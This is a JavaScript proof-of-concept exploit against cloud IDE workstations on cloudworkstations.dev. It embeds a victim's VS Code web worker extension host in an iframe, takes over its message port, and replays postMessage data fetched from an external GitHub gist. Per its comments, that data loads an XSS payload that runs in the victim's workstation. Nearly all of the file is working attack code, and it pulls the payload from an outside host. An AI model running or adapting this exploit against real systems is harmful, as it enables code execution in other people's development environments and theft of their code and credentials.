// Change this value to the victim's IDX workstation domain
var victim_idx_workstation_domain = 'firebase-test-xss-1755971113686.cluster-64pjnskmlbaxowh5lzq6i7v4ra.cloudworkstations.dev'

parentOrigin = "https://0376ie8e4dg3t412o7dphhnerrr6uika694jkch3vsaijcp8ck5p.cloudworkstations.googleusercontent.com"

ifr = document.createElement('iframe')
ifr.src = "https://"+victim_idx_workstation_domain+"/cde-c03b0d878c4bfc82293ab90104c97849f0b2631e/static/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html?parentOrigin="+parentOrigin
document.body.appendChild(ifr)

// --- start utils ---

const decoder = new TextDecoder("utf-8")
const decode = decoder.decode.bind(decoder)

const encoder = new TextEncoder("utf-8")
const encode = (str) => encoder.encode(str).buffer

// Converts hex to ArrayBuffer
function hex2buf(hex) {
    hex = "0".repeat(hex.length % 2) + hex
    return new Uint8Array(hex.match(/[\da-f]{2}/gi).map(function (h) {
        return parseInt(h, 16)
    })).buffer
}

// Converts ArrayBuffer to hex
function buf2hex(buffer) {
    return [...new Uint8Array(buffer)].map(x => x.toString(16).padStart(2, '0')).join('');
}

// Returns text output of a fetch response
async function fetch_text(...args) {
    const resp = await fetch(...args)
    return resp.text()
}

function sleep(ms) {
    return new Promise(resolve => {
        setTimeout(resolve, ms)
    })
}

// --- end utils ---

// Initiates postmessage communications
function send_map() {
    const map = new Map()
    const channel = new MessageChannel()
    map.set("idx.idx-web-ide", channel.port2)
    frames[0].postMessage({ "type": "VSCode.init", "data": map }, "*", [channel.port2])
}

let send_called = false
// Waits for the init message and then calls send_everything()
function port_listener(e) {
    const rawmsg = e.data
    // console.log("%crecived: " + decode(rawmsg), "color: gray")
    if (!send_called && buf2hex(rawmsg) == "02") { // The message is an init message
        send_called = true
        send_everything()
    }
}

// Fetches a list of postmessage data and sends them
async function send_everything() {
    const ms = Date.now();
    // One of the postmessages in the below file, contains a link to the JS file which contains the XSS payload that would be executed in the victim's idx workstation
    const hex_lines = (await fetch_text(`https://gist.githubusercontent.com/Sudistark/a643a2e8216e5a93f92bde9121333337/raw/b100c95bcb227ad70e64518ff370f3a07cc7a23f/pwn-idx.txt?cacheB=${ms}`)).split("\n")
    await sleep(100)
    for (hex of hex_lines) {
        const rawmsg = hex2buf(hex)
        // console.log("%csent: " + decode(rawmsg), "color: gray")
        port.postMessage(rawmsg)
        await sleep(5)
    }
}

// Obtains the port information and calls the send_map()
window.addEventListener("message", function add_port(e) {
    if (e.ports.length > 0) {
        window.removeEventListener("message", add_port)
        const port = e.ports[0]
        window.port = port
        port.onmessage = port_listener
        send_map()
    }
})